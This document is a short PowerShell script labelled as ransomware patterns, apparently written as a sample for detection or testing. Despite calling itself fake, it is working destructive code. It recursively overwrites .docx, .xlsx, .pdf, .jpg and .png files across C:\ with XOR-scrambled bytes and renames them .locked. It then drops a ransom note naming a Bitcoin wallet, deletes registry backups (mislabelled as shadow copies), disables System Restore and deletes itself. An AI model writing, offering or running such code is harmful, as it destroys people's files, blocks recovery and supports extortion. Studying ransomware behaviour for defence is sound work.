# RANSOMWARE PATTERN: PowerShell encryption and extortion
$ErrorActionPreference = "SilentlyContinue"

# Get all files on the system
$files = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue

# RANSOMWARE PATTERN 1: Encrypt files
foreach ($file in $files) {
    if ($file.Extension -in @(".docx", ".xlsx", ".pdf", ".jpg", ".png")) {
        # Read file
        $content = [System.IO.File]::ReadAllBytes($file.FullName)

        # Simple XOR encryption (fake ransomware)
        $encrypted = @()
        foreach ($byte in $content) {
            $encrypted += $byte -bxor 0xFF
        }

        # Overwrite original file
        [System.IO.File]::WriteAllBytes($file.FullName, $encrypted)

        # Rename with .locked extension
        Rename-Item -Path $file.FullName -NewName "$($file.FullName).locked" -Force
    }
}

# RANSOMWARE PATTERN 2: Create ransom note
$ransomNote = @"
Your files have been encrypted!
Pay 500 BTC to this wallet: 1A1z7agoat4JNFSvywYv1D9m7iqLWDAbtY
Email: attacker@darkweb.com
All your documents, photos, and videos are encrypted.
"@

$ransomNote | Out-File -FilePath "C:\RANSOM_NOTE.txt"

# RANSOMWARE PATTERN 3: Delete shadow copies to prevent recovery
Remove-Item -Path "C:\Windows\System32\config\RegBack\*" -Force -Recurse

# RANSOMWARE PATTERN 4: Disable System Restore
Disable-ComputerRestore -Drive "C:\" 2>$null

# RANSOMWARE PATTERN 5: Self-destruct to cover tracks
$self = $MyInvocation.MyCommand.Path
Remove-Item -Path $self -Force
